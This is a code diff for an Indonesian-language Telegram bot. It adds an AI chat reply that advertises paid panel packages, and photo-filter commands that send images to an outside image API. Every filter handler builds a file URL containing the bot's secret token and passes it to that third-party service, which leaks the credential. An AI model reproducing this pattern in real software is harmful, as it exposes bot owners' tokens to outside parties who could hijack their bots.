+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const userMessage = msg.text.trim();
+if (userMessage.length < 2 || userMessage.length > 500) return;
+if (msg.chat.type !== 'private') return;
+if (!isAIEnabled()) return;
+if (msg.from.is_bot) return;
+logUserInteraction(userId, username, 'private', `AI_QUERY: ${userMessage.substring(0, 50)}`);
+await bot.sendChatAction(chatId, 'typing');
+try {
+const aiResult = await callAIChat(userId, userMessage);
+if (aiResult.success) {
+await bot.sendMessage(chatId, aiResult.response, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+if (aiResult.isNewUser) {
+setTimeout(async () => {
+await bot.sendMessage(chatId,
+`<blockquote>🛒 INGIN MEMBELI PANEL?</blockquote>\n\n` +
+`Untuk membuat panel langsung, gunakan command:\n\n` +
+`<code>/unli username,id_telegram</code>\n` +
+`Contoh: <code>/unli johndoe,${userId}</code>\n\n` +
+`Atau paket lainnya:\n` +
+`<code>/1gb username,id</code>\n` +
+`<code>/seller username,id</code>\n\n` +
+`Pembayaran otomatis via QRIS!`,
+{ parse_mode: 'HTML' }
+);
+}, 1000);
+}
+} else {
+await bot.sendMessage(chatId,
+`<blockquote>⚠️ Maaf, AI sedang sibuk</blockquote>\n\n` +
+`Coba lagi nanti atau gunakan command langsung:\n` +
+`<code>/menu</code> untuk melihat menu`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+} catch (error) {
+console.error('AI handler error:', error);
+await bot.sendMessage(chatId,
+`<blockquote>❌ Gagal memproses pesan</blockquote>\n\n` +
+`Silakan coba lagi atau hubungi admin.\n` +
+`Error: <code>${escapeHTML(error.message.substring(0, 100))}</code>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📱 TOMIRROR COMMAND - AI MIRROR FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/tomirror$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/tomirror';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/tomirror</code>\n\n` +
+`<i>Balas foto yang ingin diubah jadi mirror style.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter mirror...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tomirror?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>📱 Mirror iPhone style!</blockquote>\n` +
+`<i>Filter mirror berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>📱 Mirror iPhone style!</blockquote>\n` +
+`<i>Filter mirror berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tomirror error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📱 HANDLER UNTUK FOTO DENGAN CAPTION /TOMIRROR
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/tomirror') {
+const messageText = 'PHOTO_CAPTION: /tomirror';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter mirror...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tomirror?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>📱 Mirror iPhone style!</blockquote>\n` +
+`<i>Filter mirror berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>📱 Mirror iPhone style!</blockquote>\n` +
+`<i>Filter mirror berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tomirror caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🎨 TOREAL COMMAND - AI REALISTIC FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/toreal$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/toreal';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/toreal</code>\n\n` +
+`<i>Balas foto yang ingin diubah jadi realistic style.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter realistic AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/toreal?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🎨 Realistic AI Gemini style!</blockquote>\n` +
+`<i>Filter realistic AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🎨 Realistic AI Gemini style!</blockquote>\n` +
+`<i>Filter realistic AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Toreal error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🎨 HANDLER UNTUK FOTO DENGAN CAPTION /TOREAL
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/toreal') {
+const messageText = 'PHOTO_CAPTION: /toreal';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter realistic AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/toreal?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🎨 Realistic AI Gemini style!</blockquote>\n` +
+`<i>Filter realistic AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🎨 Realistic AI Gemini style!</blockquote>\n` +
+`<i>Filter realistic AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Toreal caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🧿 TOTATO COMMAND - AI TATTOO FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/totato$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/totato';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/totato</code>\n\n` +
+`<i>Balas foto yang ingin ditambahkan tato.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Menambahkan tato dengan AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/totato?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧿 Tato berhasil ditambahkan!</blockquote>\n` +
+`<i>Filter tato AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧿 Tato berhasil ditambahkan!</blockquote>\n` +
+`<i>Filter tato AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Totato error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🧿 HANDLER UNTUK FOTO DENGAN CAPTION /TOTATO
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/totato') {
+const messageText = 'PHOTO_CAPTION: /totato';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Menambahkan tato dengan AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/totato?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧿 Tato berhasil ditambahkan!</blockquote>\n` +
+`<i>Filter tato AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧿 Tato berhasil ditambahkan!</blockquote>\n` +
+`<i>Filter tato AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Totato caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🎨 TOANIME COMMAND - AI ANIME FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/toanime$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/toanime';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/toanime</code>\n\n` +
+`<i>Balas foto yang ingin diubah jadi anime.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter anime AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/toanime?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🎨 Foto kamu berhasil diubah jadi anime!</blockquote>\n` +
+`<i>Filter anime AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🎨 Foto kamu berhasil jadi anime!</blockquote>\n` +
+`<i>Filter anime AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Toanime error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🎨 HANDLER UNTUK FOTO DENGAN CAPTION /TOANIME
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/toanime') {
+const messageText = 'PHOTO_CAPTION: /toanime';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter anime AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/toanime?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🎨 Foto kamu berhasil diubah jadi anime!</blockquote>\n` +
+`<i>Filter anime AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🎨 Foto kamu berhasil jadi anime!</blockquote>\n` +
+`<i>Filter anime AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
